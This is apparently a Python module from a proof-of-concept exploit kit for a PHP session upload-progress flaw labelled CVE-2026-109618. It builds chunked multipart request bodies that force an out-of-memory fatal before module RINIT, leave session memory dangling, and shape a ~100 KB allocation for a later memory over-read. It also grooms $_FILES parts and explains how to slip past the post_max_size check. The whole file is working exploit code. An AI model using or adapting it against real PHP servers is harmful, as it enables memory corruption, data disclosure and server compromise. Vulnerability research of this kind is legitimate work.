#!/usr/bin/env python3
# INDEX: build pre-rinit upload-progress dangle seed body | apache cli | must be sent chunked
"""Upload-progress pre-RINIT dangle SEED (CVE-2026-109618).

The shared "producer A" body: a chunked PHP_SESSION_UPLOAD_PROGRESS multipart
that primes a session (PHPSESSID + progress marker + a file part that makes the
rfc1867 hook allocate PS(http_session_vars)) and then holds/overflows it with an
OOM tail so the body-parse fatals past memory_limit BEFORE module RINIT. The
session RSHUTDOWN is skipped and PS(http_session_vars) is left dangling on the
surviving worker.

`producer_a` is parametric so each caller keeps its own geometry by passing args:
the progress `marker` size (a 64-byte plain marker vs a ~100 KB marker whose
stale `len` a leak over-reads), the pad count `npad`, the OOM `tail_len`, the
`boundary`, and `split` (return the body whole, or as (head, tail, end) for
chunked streaming). Must be sent Transfer-Encoding: chunked so the parser faults
mid-body, bypassing the Content-Length / post_max_size pre-check.

Platform: php-src 8.4.x/8.5.x. Pure stdlib; safe under `python3 -I`.
"""
from __future__ import annotations

import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import PROGRESS_KEY, part, part_tuple, terminator  # noqa: E402

from common.session_ids import SID_A as DEFAULT_SID  # noqa: E402


def producer_a(sid, marker, npad, tail_len, boundary, split=False,
               pad_value: bytes = b"P" * 7, pad_name_fmt="p%d",
               sid_field=b"PHPSESSID", progress_key=PROGRESS_KEY,
               file_field=b"f", file_value: bytes = b"D" * 8,
               filename="a.txt", ctype="application/octet-stream",
               tail_field=b"z", tail_byte: bytes = b"T"):
    """Build the producer-A body.

    Order: PHPSESSID -> PHP_SESSION_UPLOAD_PROGRESS(marker) -> npad tiny pads ->
    file part (allocates PS(http_session_vars)) -> OOM tail (tail_len bytes) ->
    terminator. With `split=True` returns (head, tail, end) for chunked streaming;
    otherwise returns the full body bytes. `tail_len=0` omits the OOM tail.
    """
    head = part(sid_field, sid, boundary=boundary)
    head += part(progress_key, marker, boundary=boundary)
    for i in range(npad):
        head += part(pad_name_fmt % i, pad_value, boundary=boundary)
    head += part(file_field, file_value, filename=filename, ctype=ctype,
                 boundary=boundary)
    tail = part(tail_field, tail_byte * tail_len, boundary=boundary) if tail_len else b""
    end = terminator(boundary)
    if split:
        return head, tail, end
    return head + tail + end


def big_marker(tag: bytes = b"0000i097", pad: int = 99992) -> bytes:
    """The ~100 KB progress marker used by the leak producers (pad `M`s + tag).
    The oversized marker shapes a ~100 KB allocation whose stale `len` a later
    in-band over-read discloses."""
    return b"M" * pad + tag


def progress_preamble(sid=DEFAULT_SID):
    """[PHPSESSID, PHP_SESSION_UPLOAD_PROGRESS] preamble parts (tuple form)."""
    return [part_tuple("PHPSESSID", sid),
            part_tuple("PHP_SESSION_UPLOAD_PROGRESS", "k")]


def file_parts(count, name_len=8, body=b"x" * 8, nest=0, key_len=1,
               empty_filename=False):
    """Yield `count` $_FILES groom file parts (nest / key_len / empty-filename modes)."""
    for i in range(count):
        if nest:
            name = f"f{i}" + ("[%s]" % ("k" * key_len)) * nest
            fname = "f.txt" if not empty_filename else ""
        else:
            name = f"u{i}".ljust(name_len, "A")
            fname = f"{name}.txt" if not empty_filename else ""
        if empty_filename:
            yield part_tuple(name, b"", filename="", ctype="text/plain")
        else:
            yield part_tuple(name, body, filename=fname, ctype="text/plain")


if __name__ == "__main__":  # smoke test of the seed (no network)
    import secrets
    sid = (b"i097" + secrets.token_hex(14).encode())[:32]
    whole = producer_a(sid, marker=b"M" * 64, npad=8, tail_len=1024,
                       boundary=b"rsd" + b"D" * 7)
    head, tail, end = producer_a(sid, marker=big_marker(), npad=60, tail_len=1024,
                                 boundary=b"i097b", split=True)
    print("whole : %d bytes" % len(whole))
    print("split : head=%d tail=%d end=%d" % (len(head), len(tail), len(end)))
